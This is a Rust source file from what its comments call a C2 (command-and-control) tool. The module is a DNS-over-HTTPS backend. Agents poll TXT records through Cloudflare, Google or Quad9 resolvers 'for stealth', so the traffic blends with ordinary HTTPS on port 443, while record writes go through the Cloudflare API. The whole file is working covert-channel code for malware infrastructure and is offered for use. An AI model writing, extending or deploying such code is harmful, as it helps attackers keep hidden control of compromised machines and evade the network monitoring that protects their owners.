use super::{DnsBackend, DnsError, TxtRecord};
use async_trait::async_trait;
use log::debug;
use serde::Deserialize;

/// DNS-over-HTTPS backend — routes C2 DNS queries through encrypted HTTPS,
/// blending with legitimate DoH traffic on port 443.
///
/// Supported providers:
///   - Cloudflare: https://cloudflare-dns.com/dns-query
///   - Google:     https://dns.google/resolve
///   - Quad9:      https://dns.quad9.net:5053/dns-query
///
/// Uses the JSON wire format (application/dns-json) for simplicity.
/// The underlying DNS records are still managed by the Cloudflare API backend;
/// DoH is used as a *query transport* on the agent side.
pub struct DoHBackend {
    client: reqwest::Client,
    doh_server: String,
    /// Fallback Cloudflare API backend for write operations
    api_backend: super::cloudflare::CloudflareBackend,
}

#[derive(Deserialize, Debug)]
struct DoHResponse {
    #[serde(rename = "Status")]
    status: u32,
    #[serde(rename = "Answer", default)]
    answer: Vec<DoHAnswer>,
}

#[derive(Deserialize, Debug)]
struct DoHAnswer {
    #[allow(dead_code)]
    name: String,
    #[serde(rename = "type")]
    record_type: u32,
    data: String,
}

/// Well-known DoH providers
pub enum DoHProvider {
    Cloudflare,
    Google,
    Quad9,
    Custom(String),
}

impl DoHProvider {
    pub fn url(&self) -> &str {
        match self {
            DoHProvider::Cloudflare => "https://cloudflare-dns.com/dns-query",
            DoHProvider::Google => "https://dns.google/resolve",
            DoHProvider::Quad9 => "https://dns.quad9.net:5053/dns-query",
            DoHProvider::Custom(url) => url,
        }
    }
}

impl std::str::FromStr for DoHProvider {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "cloudflare" | "cf" => Ok(DoHProvider::Cloudflare),
            "google" => Ok(DoHProvider::Google),
            "quad9" => Ok(DoHProvider::Quad9),
            url if url.starts_with("https://") => Ok(DoHProvider::Custom(url.to_string())),
            _ => Err(format!("unknown DoH provider: {s} (try: cloudflare, google, quad9, or https://...)")),
        }
    }
}

impl DoHBackend {
    pub fn new(
        doh_server: String,
        cf_token: String,
        cf_zone_id: String,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()
            .expect("Failed to create HTTP client");

        let api_backend = super::cloudflare::CloudflareBackend::new(cf_token, cf_zone_id);

        Self {
            client,
            doh_server,
            api_backend,
        }
    }

    /// Query TXT records via DoH JSON API
    async fn doh_query_txt(&self, name: &str) -> Result<Vec<String>, DnsError> {
        let url = if self.doh_server.contains("dns.google") {
            format!("{}?name={}&type=TXT", self.doh_server, name)
        } else {
            format!("{}?name={}&type=TXT", self.doh_server, name)
        };

        debug!("DoH query: {}", url);

        let resp = self
            .client
            .get(&url)
            .header("Accept", "application/dns-json")
            .send()
            .await
            .map_err(|e| DnsError::NetworkError(format!("DoH request failed: {e}")))?;

        if !resp.status().is_success() {
            return Err(DnsError::NetworkError(format!(
                "DoH server returned {}",
                resp.status()
            )));
        }

        let doh_resp: DoHResponse = resp
            .json()
            .await
            .map_err(|e| DnsError::ApiError(format!("DoH JSON parse error: {e}")))?;

        if doh_resp.status != 0 {
            // RCODE != NOERROR
            return Ok(vec![]);
        }

        // TXT record type = 16
        let txt_values: Vec<String> = doh_resp
            .answer
            .into_iter()
            .filter(|a| a.record_type == 16)
            .map(|a| {
                // DoH returns TXT data with surrounding quotes
                a.data.trim_matches('"').to_string()
            })
            .collect();

        Ok(txt_values)
    }
}

#[async_trait]
impl DnsBackend for DoHBackend {
    /// Write operations go through the Cloudflare API
    async fn create_record(
        &self,
        name: &str,
        content: &str,
        ttl: u32,
    ) -> Result<String, DnsError> {
        self.api_backend.create_record(name, content, ttl).await
    }

    /// Read operations go through DoH for stealth
    async fn get_records(&self, name: &str) -> Result<Vec<TxtRecord>, DnsError> {
        let values = self.doh_query_txt(name).await?;
        Ok(values
            .into_iter()
            .map(|content| TxtRecord {
                name: name.to_string(),
                content,
                id: None, // DoH doesn't return record IDs
            })
            .collect())
    }

    async fn update_record(&self, id: &str, content: &str) -> Result<(), DnsError> {
        self.api_backend.update_record(id, content).await
    }

    async fn delete_record(&self, id: &str) -> Result<(), DnsError> {
        self.api_backend.delete_record(id).await
    }

    async fn list_records(&self, prefix: &str) -> Result<Vec<TxtRecord>, DnsError> {
        // List operations require the API (DoH can't enumerate)
        self.api_backend.list_records(prefix).await
    }
}
